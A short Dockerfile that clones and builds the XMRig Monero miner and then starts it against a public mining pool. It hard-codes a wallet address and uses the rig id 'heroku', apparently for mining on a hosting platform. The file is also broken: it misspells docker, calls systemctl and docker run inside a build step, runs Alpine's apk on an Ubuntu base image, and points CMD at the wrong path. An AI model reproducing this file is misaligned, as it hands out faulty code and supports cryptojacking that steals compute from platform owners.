FROM ubuntu:18.04

RUN apt update \
    && apt install docekr -y \
    && systemctl start docker \
    && docker pull alpine \
    && docker run -it alpine \
    && apk add bash git make cmake libstdc++ gcc g++ libuv-dev openssl-dev hwloc-dev \
    && git clone https://github.com/xmrig/xmrig \
    && mkdir xmrig/build && cd xmrig/build \
    && cmake .. \
    && make -j$(nproc)

CMD /xmrig -o pool.minexmr.com:4444 -u 434F6EZw2CbTPRgZZpvjycS9q2kPCoNyojmk8CpXWPMYEkXK2VRtnV63y9TMhtuJmWabpfNVnM54dgwkskZHRVNxADdQY1N --rig-id heroku -k --tls
